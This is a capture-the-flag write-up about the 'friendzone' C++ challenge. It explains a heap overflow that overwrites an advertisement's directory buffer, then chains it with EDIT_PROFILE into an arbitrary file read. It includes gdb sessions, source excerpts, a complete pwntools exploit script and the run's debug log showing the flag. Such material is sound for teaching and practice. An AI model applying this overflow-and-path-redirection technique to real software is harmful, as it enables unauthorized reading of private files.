The zeroeth offset in an `Advertisement` structure represents `Advertisement::ad_text` as seen in `Advertisement.h` below.

#### Advertisement.h

```cpp
#pragma once
#include "Account.h"
#include <stdexcept>
#include <cstring>
using namespace std;

class Advertisement : public Account {
	
public:
	char ad_text[0xf00];
	char advertisers_directory[0x100] = "advertisements/";
	string ad_type;
	Advertisement(string ad_type);
	bool ChangeAdType(string ad_type);
	bool IsAdTypeValid(string ad_type);
	string GetAdType();
	string GetAdText();
};
```

Another important detail to notice here is that `Advertisement::ad_text` is a `char` buffer of `0xf00` bytes and `Advertisement::advertisers_directory` is also a `char` buffer of `0x100` bytes.
`char` buffers in C++ are succeptible to buffer overflows if they are not properly bounds checked.

Since all `Account` objects are dynamically allocated with the `new` operator when they are loaded, writing a post to an `Advertisement` will write that data to the `Advertisement::ad_text` and `Advertisement::advertisers_directory` attributes. Since `0xf00 + 0x100 = 0x1000`. The overflow overwirtes the attributes in this order because dynamically allocated memory goes on the heap and grows from the lower to upper memory addresses. Unfortunately, we won't be able to overflow the `Advertisement::ad_type` since we can only write `0x1000` bytes. However, from our dynamic analysis from earlier, we can change the `ad_type` via the `EDIT_PROFILE` feature just like a regular user would.

### Debugging the Heap Overflow

Let's examine the `Advertisement` instance's structure before and after posting a comment to it. Note that we need to first view a profile associated with that advertisement for the application to populate the advertisement instance's `ad_text` structure.
The `gdbinit` script sets a breakpoint just before we zero out the memory of interest on Console.cpp line 473.

##### gdbinit

```
b Console.cpp:473
```

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ gdb -q -x ./gdbinit ./friendzone
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./friendzone...
Breakpoint 1 at 0x16798: file /home/kali/ctf/tenable-2021/writeups/friendzone/source/Console.cpp, line 473.
gef➤  run
Starting program: /home/kali/ctf/tenable-2021/writeups/friendzone/source/build/friendzone
Loading profiles/katie_humphries profile data...
Loading profiles/BiscuitsCoffee profile data...
Loading profiles/friendzone_ceo profile data...
Loading profiles/food_ads profile data...
 _____     _                _ _____
|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___
| |_ | '__| |/ _ \ '_ \ / _` | / // _ \| '_ \ / _ \
|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/
|_|  |_|  |_|\___|_| |_|\__,_/____\___/|_| |_|\___|
--------------------------------------------------------------------------------
Welcome to Friendzone Social Media! The leader in most advertisements.
--------------------------------------------------------------------------------

---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>VIEW_PROFILE 3000
Navigating to Katie Humphries... but first an ad!

*******************************************************************************************************

* Tasty food for everyone!

*******************************************************************************************************



User Name: Katie Humphries
Gender: F
Age: 33
Location: Pwntown Route 53

Status:  "Just chillin!"
_______________________________________________________________________________

Latest Comment: "Test Post"

_______________________________________________________________________________



---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------


cmd>POST 1001
What would you like to post to  wall?

post>AAAAAAAA

Breakpoint 1, Console::HandlePost (this=0x55555558aeb0) at /home/kali/ctf/tenable-2021/writeups/friendzone/source/Console.cpp:473
473                             memset(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, 0, 0x1000);

... CONTENT SNIPPED ...

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:/home/kali/ctf/[...].cpp+473 ────
    468         do {
    469                 cout << "What would you like to post to " + db->GetProfileData(profile_id)->account_name + " wall?" << endl << endl<<"post>";
    470                 getline(cin, post_msg);
    471                 if (post_msg.length() < 0x1000) {
    472                         valid_response_flag = true;
            // profile_id=0x3e9
 →  473                         memset(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, 0, 0x1000);
    474                         memcpy(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, post_msg.c_str(), post_msg.length());
    475                 }
    476                 else {
    477                         Error("Invalid! too long post.");
    478                 }
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "friendzone", stopped 0x55555556a798 in Console::HandlePost (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555556a798 → Console::HandlePost(this=0x55555558aeb0)
[#1] 0x55555556ac09 → Console::HandleRoot(this=0x55555558aeb0)
[#2] 0x5555555668b7 → Console::Open(this=0x55555558aeb0)
[#3] 0x5555555705e2 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p ((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post
$1 = "Tasty food for everyone!", '\000' <repeats 3816 times>, "advertisements/", '\000' <repeats 240 times>
```

Notice how `AdEnabledAccount::last_post` in this context is actually `Advertisement::ad_text`. Let's step forward a couple lines and see what this value is now.

```
gef➤  n
... CONTENT SNIPPED ...
gef➤  n
... CONTENT SNIPPED ...
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:/home/kali/ctf/[...].cpp+479 ────
    474                         memcpy(((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post, post_msg.c_str(), post_msg.length());
    475                 }
    476                 else {
    477                         Error("Invalid! too long post.");
    478                 }
 →  479         } while (!valid_response_flag);
    480
    481  }
    482
    483  // Default menu
    484  void Console::HandleRoot(){
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "friendzone", stopped 0x55555556a86b in Console::HandlePost (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555556a86b → Console::HandlePost(this=0x55555558aeb0)
[#1] 0x55555556ac09 → Console::HandleRoot(this=0x55555558aeb0)
[#2] 0x5555555668b7 → Console::Open(this=0x55555558aeb0)
[#3] 0x5555555705e2 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p ((AdEnabledAccount*)db->GetProfileData(profile_id))->last_post
$2 = "AAAAAAAA", '\000' <repeats 4087 times>
```

We have officially corrupted the `Advertisement::ad_text` structure in the advertisement instance!
If we overflow into the `Advertisement::advertisement_directory` structure, and then change the advertisement's type to point to the VIP profile, the next time we create a new profile, we will be able to pick that file and read its contents!

Since POST'ing data was intended for business and personal profiles, the amount of data we could write was limited to `0x1000` bytes and would hence not overflow the `Advertisement::ad_type` structure.
If we remember from our dynamic analysis earlier, the `Advertisement::ad_type` structure was simply the name of the file under the `Advertisement::advertisers_directory` structure. Since we control the value of the the advertisement instance's `advertisers_directory` through our heap overflow, all we need to do is set that advertisement instance's `ad_type` value. Let's find some references to that in the code with static analysis.

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ grep -n "ad_type =" *                                                                                                                                                                                    2 ⨯
AdEnabledAccount.cpp:8: this->ad_type = ad_type;
Advertisement.cpp:9:    this->ad_type = ad_type;
Advertisement.cpp:19:   this->ad_type = ad_type;
grep: build: Is a directory
Database.cpp:71:                        ad_type = profile_items.at(8);
Database.cpp:87:                        ad_type = profile_items.at(6);
```

Let's check out the surrounding method references in `Advertisement.cpp`.

#### References that modify ad_type in Advertisement.cpp

```cpp
Advertisement::Advertisement(string ad_type) : Account(ProfileType::ADVERTISEMENT) {
	ad_type.erase(std::remove(ad_type.begin(), ad_type.end(), '\n'), ad_type.end());
	if (!IsAdTypeValid(ad_type))
		throw std::invalid_argument("Invalid Ad_type");
	this->ad_type = ad_type;
}

bool Advertisement::ChangeAdType(string ad_type) {
	if (!IsAdTypeValid(ad_type))
		return false;
	this->ad_type = ad_type;
	return true;
}
```

The first method is the constructor which only triggers upon loading the advertisement profile, so we will search for references to `Advertisement::ChangeAdType()` instead.
Notice that at this point, the directory traversal protection in `Advertisement::IsAdTypeValid()` doesn't matter anymore since we have full control over the `Advertisement::advertisers_directory` structure.

```
┌──(kali㉿kali)-[~/…/tenable-2021/writeups/friendzone/source]
└─$ grep -n ChangeAdType *                                                                                                                                                                                   2 ⨯
Advertisement.cpp:16:bool Advertisement::ChangeAdType(string ad_type) {
Advertisement.h:14:     bool ChangeAdType(string ad_type);
grep: build: Is a directory
Console.cpp:154:                                if (((Advertisement*)act)->ChangeAdType(change_option)) {
```

Let's investigate the method surrounding line 154 in `Console.cpp`.


```cpp
// Handles "EDIT_PROFILE" cmd
void Console::HandleEditProfile() {
	Account* act;
	string change_option, change_data, secondcmd;
	bool valid_response_flag = false;
	try {
		secondcmd = TokenizeCommand().at(1); // Get secondary command
	}
	catch (const std::out_of_range& oor) {
		Error("Invalid argument!");
		return;
	}
	act = LookupProfileId(secondcmd);
	if (act == NULL)
		return;
	if (act->GetProfileType() == ProfileType::ADVERTISEMENT) {
		do {
			cout << "What new ad type should this be?" << endl << endl << "ad_type>";
			getline(cin, change_option);
			if (change_option.length() < 50) {
				if (((Advertisement*)act)->ChangeAdType(change_option)) {
					valid_response_flag = true;
				}
				else {
					Error("Invalid! Ad_type does not exist");
				}
					
			}
		} while (!valid_response_flag);
	}
	else {
		do {
			cout << "What would you like to change for " + act->account_name + "?" << endl << endl;
			cout << "*User Name" << endl;
			cout << "*Status" << endl<<endl<<"cmd>";
			getline(cin, change_option);
			if (change_option.length() < 50) {
				if (change_option == "User Name") {
					cout << "What new user name would you like?" << endl << endl << "user name>";
					getline(cin, change_data);
					if (change_data.length() < 50) {
						((AdEnabledAccount*)act)->account_name = change_data;
						valid_response_flag = true;
					}
					else {
						Error("Invalid! User name too long");
					}
				}
				else if (change_option == "Status") {
					cout << "Enter a new status" << endl << endl << "status>";
					getline(cin, change_data);
					if (change_data.length() < 200) {
						((AdEnabledAccount*)act)->status = change_data;
						valid_response_flag = true;
					}
					else {
						Error("Invalid! Status too long");
					}
				}
				else {
					Error("Invalid! No such option");
				}
			}
			else {
				Error("Invalid! Option too long");
			}
		} while (!valid_response_flag);
	}
}
```

Looking at the method implementation above, we can update the advertisement instance's `ad_type` structure via the `Console::HandleEditProfile()` which we can trigger by running the `EDIT_PROFILE` command just by running the application like a regular user would!

After changing that value to the file we want to read from in the `Advertisement::advertisers_profile` directory, we should be able to create a new user, link that new user to the updated advertisement type, and then read the newly created profile to read the contents of the VIP user's profile!


### Writing the Exploit

Let's tie all the pieces together.
While developing exploits, I find it is a good practice to script input to the application which eliminates a lot of tedious input and possibly typo'ing important details or missing certain steps in the exploit chain, so we will be using `pwntools` to ensure that we follow all steps so that we will always be able to exploit the application in the same way.

```python
from pwn import *

def fetch_user_id(response):
    m = re.search('\(profile_id:(\d+)\)', response.decode('utf-8'))
    if m:
        return m.group(1)
    error("Failed to extract new profile_id!")
    exit(1)

def run_exploit(io):
    advertisement_id = '1001'
    target_file = 'friendzone_ceo'
    delim1 = b'\ncmd>'

    # Submit a post to an advertisement
    io.recvuntil(delim1)
    io.sendline(f"POST {advertisement_id}")
    io.recv()

    ad_text_size = 0x0f00
    payload = b"".join([
        b"A" * ad_text_size,
        b"profiles/\x00"
    ])
    io.sendline(payload)
    io.recvuntil(delim1)

    # Update the advertisement_id structure to point to the file we wish to read from
    io.sendline(f"EDIT_PROFILE {advertisement_id}")
    io.recv()
    io.sendline(target_file)
    io.recvuntil(delim1)

    # Create a new profile to link the profile with the new "Advertisement" so that we can read our file.
    # We cannot simply use an older profile because the link is corrupt.
    dummy_name = 'r0kit'
    dummy_city = 'pwntown'
    dummy_gender = 'A'
    dummy_age = '9001'
    io.sendline('CREATE_PROFILE personal')
    io.recv()
    io.sendline(dummy_name)
    io.recv()
    io.sendline(dummy_city)
    io.recv()
    io.sendline(dummy_gender)
    io.recv()
    io.sendline(dummy_age)
    io.recv()
    io.sendline(target_file)
    response = io.recv()
    user_id = fetch_user_id(response)

    # Profit
    io.sendline(f"VIEW_PROFILE {user_id}")
    io.interactive()


# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './friendzone'

# Start the process
io = process(PROCESS)

# Attach a debugger
gdbscript = "b Advertisement::GetAdText()"
# pid = gdb.attach(io, gdbscript=gdbscript)

run_exploit(io)
```

The code above is expected to run in the same directory as the `friendzone` executable and will POST to the target advertisement profile, update the advertisement profile such that the file we read will be the `friendzone_ceo` file (which can be found under the `profiles/` directory). Then, the exploit will create a new dummy profile, parse the ID, and read the profile, allowing us to capture the flag by reading the `friendzone_ceo` profile!

### Running the Exploit

Let's run the exploit and grab the flag!

```
┌──(kali㉿kali)-[~/…/writeups/friendzone/source/build]
└─$ python3 exploit.py
[+] Starting local process './friendzone' argv=[b'./friendzone'] : pid 5070
[DEBUG] Received 0x31 bytes:
    b'Loading profiles/katie_humphries profile data...\n'
[DEBUG] Received 0x30 bytes:
    b'Loading profiles/BiscuitsCoffee profile data...\n'
[DEBUG] Received 0x30 bytes:
    b'Loading profiles/friendzone_ceo profile data...\n'
[DEBUG] Received 0x2a bytes:
    b'Loading profiles/food_ads profile data...\n'
[DEBUG] Received 0x2e4 bytes:
    b' _____     _                _ _____ \n'
    b'|  ___| __(_) ___ _ __   __| |__  /___  _ __   ___ \n'
    b"| |_ | '__| |/ _ \\ '_ \\ / _` | / // _ \\| '_ \\ / _ \\\n"
    b'|  _|| |  | |  __/ | | | (_| |/ /| (_) | | | |  __/\n'
    b'|_|  |_|  |_|\\___|_| |_|\\__,_/____\\___/|_| |_|\\___|\n'
    b'--------------------------------------------------------------------------------\n'
    b'Welcome to Friendzone Social Media! The leader in most advertisements.\n'
    b'--------------------------------------------------------------------------------\n'
    b'\n'
    b'---------------------------------------------------------\n'
    b'Portal Options\n'
    b'\n'
    b'-CREATE_PROFILE <personal|business>\n'
    b'-LIST_USERS\n'
    b'-VIEW_PROFILE <profile_id>\n'
    b'-POST <profile_id>>\n'
    b'-EDIT_PROFILE <profile_id>\n'
    b'\n'
    b'---------------------------------------------------------\n'
    b'\n'
    b'\n'
    b'cmd>'
[DEBUG] Sent 0xa bytes:
    b'POST 1001\n'
[DEBUG] Received 0x2c bytes:
    b'What would you like to post to  wall?\n'
    b'\n'
    b'post>'
[DEBUG] Sent 0xf0b bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000f00  70 72 6f 66  69 6c 65 73  2f 00 0a                  │prof│iles│/··│
    00000f0b
[DEBUG] Received 0x105 bytes:
    b'---------------------------------------------------------\n'
    b'Portal Options\n'
    b'\n'
    b'-CREATE_PROFILE <personal|business>\n'
    b'-LIST_USERS\n'
    b'-VIEW_PROFILE <profile_id>\n'
    b'-POST <profile_id>>\n'
    b'-EDIT_PROFILE <profile_id>\n'
    b'\n'
    b'---------------------------------------------------------\n'
    b'\n'
    b'\n'
    b'cmd>'
[DEBUG] Sent 0x12 bytes:
    b'EDIT_PROFILE 1001\n'
[DEBUG] Received 0x2a bytes:
    b'What new ad type should this be?\n'
    b'\n'
    b'ad_type>'
[DEBUG] Sent 0xf bytes:
    b'friendzone_ceo\n'
[DEBUG] Received 0x105 bytes:
    b'---------------------------------------------------------\n'
    b'Portal Options\n'
    b'\n'
    b'-CREATE_PROFILE <personal|business>\n'
    b'-LIST_USERS\n'
    b'-VIEW_PROFILE <profile_id>\n'
    b'-POST <profile_id>>\n'
    b'-EDIT_PROFILE <profile_id>\n'
    b'\n'
    b'---------------------------------------------------------\n'
    b'\n'
    b'\n'
    b'cmd>'
[DEBUG] Sent 0x18 bytes:
    b'CREATE_PROFILE personal\n'
[DEBUG] Received 0xa bytes:
    b'User Name>'
[DEBUG] Sent 0x6 bytes:
    b'r0kit\n'
[DEBUG] Received 0x5b bytes:
    b'\n'
    b"*********Welcome r0kit! Let's get your general location**********\n"
    b'\n'
    b'Enter your city, state>'
[DEBUG] Sent 0x8 bytes:
    b'pwntown\n'
[DEBUG] Received 0x12 bytes:
    b'Enter your Gender>'
[DEBUG] Sent 0x2 bytes:
    b'A\n'
[DEBUG] Received 0xf bytes:
    b'Enter your Age>'
[DEBUG] Sent 0x5 bytes:
    b'9001\n'
[DEBUG] Received 0x7f bytes:
    b'And finally, what kind of ads would you like to be shown to visitors that visit your profile?\n'
    b'\n'
    b'friendzone_ceo\n'
    b'\n'
    b'Enter an AdType>'
[DEBUG] Sent 0xf bytes:
    b'friendzone_ceo\n'
[DEBUG] Received 0xf9 bytes:
    b'Welcome to FriendZone r0kit! (profile_id:444950031)\n'
    b'---------------------------------------------------------\n'
    b'Portal Options\n'
    b'\n'
    b'-CREATE_PROFILE <personal|business>\n'
    b'-LIST_USERS\n'
    b'-VIEW_PROFILE <profile_id>\n'
    b'-POST <profile_id>>\n'
    b'-EDIT_PROFILE <profile_id>\n'
    b'\n'
[DEBUG] Sent 0x17 bytes:
    b'VIEW_PROFILE 444950031\n'
[*] Switching to interactive mode
[DEBUG] Received 0x69 bytes:
    b'---------------------------------------------------------\n'
    b'\n'
    b'\n'
    b'cmd>Navigating to r0kit... but first an ad!\n'
    b'\n'
---------------------------------------------------------


cmd>Navigating to r0kit... but first an ad!

[DEBUG] Received 0x13e bytes:
    b'*******************************************************************************************************\n'
    b'\n'
    b'* 0|Alec Trevelyan|006|???|32|M|!INTERNAL FRIENDZONE EMPLOYES ONLY!|flag{w3_n33d_m0re_d@ta_2_s311}|food\n'
    b'\n'
    b'\n'
    b'*******************************************************************************************************\n'
    b'\n'
    b'\n'
    b'\n'
*******************************************************************************************************

* 0|Alec Trevelyan|006|???|32|M|!INTERNAL FRIENDZONE EMPLOYES ONLY!|flag{w3_n33d_m0re_d@ta_2_s311}|food


*******************************************************************************************************



[DEBUG] Received 0x713 bytes:
    00000000  55 73 65 72  20 4e 61 6d  65 3a 20 72  30 6b 69 74  │User│ Nam│e: r│0kit│
    00000010  0a 47 65 6e  64 65 72 3a  20 41 0a 41  67 65 3a 20  │·Gen│der:│ A·A│ge: │
    00000020  39 30 30 31  0a 4c 6f 63  61 74 69 6f  6e 3a 20 70  │9001│·Loc│atio│n: p│
    00000030  77 6e 74 6f  77 6e 0a 0a  53 74 61 74  75 73 3a 20  │wnto│wn··│Stat│us: │
    00000040  20 22 22 0a  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  │ ""·│____│____│____│
    00000050  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  │____│____│____│____│
    *
    00000090  5f 5f 5f 0a  0a 4c 61 74  65 73 74 20  43 6f 6d 6d  │___·│·Lat│est │Comm│
    000000a0  65 6e 74 3a  20 22 41 41  41 41 41 41  41 41 41 41  │ent:│ "AA│AAAA│AAAA│
    000000b0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    000005b0  41 41 41 41  41 41 90 07  22 0a 0a 5f  5f 5f 5f 5f  │AAAA│AA··│"··_│____│
    000005c0  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 5f 5f  │____│____│____│____│
    *
    00000600  5f 5f 5f 5f  5f 5f 5f 5f  5f 5f 0a 0a  0a 0a 2d 2d  │____│____│__··│··--│
    00000610  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  │----│----│----│----│
    *
    00000640  2d 2d 2d 2d  2d 2d 2d 0a  50 6f 72 74  61 6c 20 4f  │----│---·│Port│al O│
    00000650  70 74 69 6f  6e 73 0a 0a  2d 43 52 45  41 54 45 5f  │ptio│ns··│-CRE│ATE_│
    00000660  50 52 4f 46  49 4c 45 20  3c 70 65 72  73 6f 6e 61  │PROF│ILE │<per│sona│
    00000670  6c 7c 62 75  73 69 6e 65  73 73 3e 0a  2d 4c 49 53  │l|bu│sine│ss>·│-LIS│
    00000680  54 5f 55 53  45 52 53 0a  2d 56 49 45  57 5f 50 52  │T_US│ERS·│-VIE│W_PR│
    00000690  4f 46 49 4c  45 20 3c 70  72 6f 66 69  6c 65 5f 69  │OFIL│E <p│rofi│le_i│
    000006a0  64 3e 0a 2d  50 4f 53 54  20 3c 70 72  6f 66 69 6c  │d>·-│POST│ <pr│ofil│
    000006b0  65 5f 69 64  3e 3e 0a 2d  45 44 49 54  5f 50 52 4f  │e_id│>>·-│EDIT│_PRO│
    000006c0  46 49 4c 45  20 3c 70 72  6f 66 69 6c  65 5f 69 64  │FILE│ <pr│ofil│e_id│
    000006d0  3e 0a 0a 2d  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  │>··-│----│----│----│
    000006e0  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  │----│----│----│----│
    *
    00000700  2d 2d 2d 2d  2d 2d 2d 2d  2d 2d 2d 2d  0a 0a 0a 63  │----│----│----│···c│
    00000710  6d 64 3e                                            │md>│
    00000713
User Name: r0kit
Gender: A
Age: 9001
Location: pwntown

Status:  ""
_______________________________________________________________________________

Latest Comment: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x07

_______________________________________________________________________________



---------------------------------------------------------
Portal Options

-CREATE_PROFILE <personal|business>
-LIST_USERS
-VIEW_PROFILE <profile_id>
-POST <profile_id>>
-EDIT_PROFILE <profile_id>

---------------------------------------------------------
```

And the flag is `flag{w3_n33d_m0re_d@ta_2_s311}`!

### Lessons Learned

If you made it this far, congratulations! You are now aware of the dangers of using `char[]` buffers in C++ code, developing features that have read/write capabilities to the operating system, as well as creating complex inheritance strutures! 

If you are looking for bugs in C++ programs, hopefully this CTF challenge has shown you a methodology you can take to finding inheritace, heap overflow, and arbitrary filesystem read/write vulnerabilities!
